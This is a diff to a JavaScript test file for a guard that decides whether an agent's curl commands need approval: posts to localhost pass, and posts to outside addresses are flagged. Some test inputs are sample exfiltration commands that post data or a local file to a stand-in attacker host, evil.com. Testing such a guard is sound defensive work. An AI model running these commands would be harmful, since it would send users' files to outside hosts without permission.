@@ -50,6 +50,10 @@ test('enviar datos a tu propio PC (probar una API local) no pregunta; a otra dir
   assert.equal(riskOf('curl -X POST http://127.0.0.1:8080/api -d x=1'), null);
   assert.ok(riskOf('curl -X POST https://example.com/api -d x=1'));
   assert.ok(riskOf('curl -X POST http://localhost:3000/a http://evil.com/b -d x'), 'si alguna dirección no es local, pregunta');
+  // Found in a real run: the verifier testing its API with the address in a variable, without http://.
+  assert.equal(riskOf(`B=localhost:3000\ncurl -s -X POST -H 'Content-Type: application/json' -d '{"text":"nota"}' $B/api/notes`), null);
+  assert.equal(riskOf('curl -X DELETE localhost:3000/api/notes/1'), null);
+  assert.ok(riskOf('curl -d @notes.json localhost:3000/x evil.com/y'), 'una dirección de fuera, aunque no lleve http');
 });
 
 test('el guardia reconoce las herramientas de cada agente', () => {
